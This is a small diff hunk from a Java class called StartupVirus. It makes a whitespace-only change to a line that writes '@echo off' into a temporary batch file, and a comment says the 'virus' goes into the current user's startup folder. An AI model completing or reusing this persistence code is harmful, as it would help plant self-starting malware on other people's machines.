@@ -35,7 +35,7 @@ public class StartupVirus {
 		
 		if(tempFile.exists()){
 			tempFile.setWritable(true);
-			bufferedWriter.write("@echo off"); 
+			bufferedWriter.write("@echo off");
 			bufferedWriter.newLine();
 			
 			//location of where virus will go >> in the startup folder of the current user
